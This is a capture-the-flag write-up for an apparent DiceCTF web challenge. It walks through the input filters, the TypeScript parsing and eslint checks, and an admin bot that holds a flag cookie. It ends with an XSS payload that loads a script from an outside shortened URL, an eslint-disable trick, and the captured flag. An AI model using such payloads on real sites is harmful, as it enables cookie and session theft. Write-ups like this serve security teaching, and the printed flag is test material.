# Analysis

- the input should be inside the [space - ~] range basically omitting all `\x` characters.

```ts
if (/[^ -~]|;/.test(input)) {
```

- The input will be parsed to test if it's really one statement

```ts
const file = ts.createSourceFile("file.ts", text, ScriptTarget.Latest);
console.log("statemetns", { statements: file.statements });
if (file.statements.length !== 1) {
  return {
    success: false,
    errors: ["expected a single statement"],
  };
}
```

[Expression Statements]https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/Expression_statement()

Then it will be injected to the string code

```ts
const data = `((): ${type} => (${expression.output}))()`;
```

- Then the input will be linted with eslint to see if it follows the rules

```
  const project = new VirtualProject("file.ts", data);
  const { errors, messages } = await project.lint();
```

Also we have initial checks before running any of the previous.

```ts
if (query.length > 75) {
  return "equation is too long";
```

Also the goal is to steal the admin token

```
  const query = req.query.q ? req.query.q.toString() : "";
  console.log({ query });
  const message = query ? await runQuery(req.query.q as string) : "";
  console.log({ message });
```

- We need xss inside the message to get the flag

```ts
await page.setCookie({
  name: "flag",
  value: FLAG,
  domain: new URL(SITE).host,
});
await page.goto(url, { timeout: 5000, waitUntil: "domcontentloaded" });
await sleep(5000);
```

## Solution

So here is the take:

> Make a single expression statement that gets strings `' + 'payload here'`
> Bypass the eslint, we can do that by adding an eslint hint that disables it
> Make sure the payload doesn't exceed 75 chars length.

## Payload

`'<script src='https://t.ly/Gi-0o'></script>' /_disable-line-eslint_/`

## FLAG

dice{society_if_typescript_were_sound}
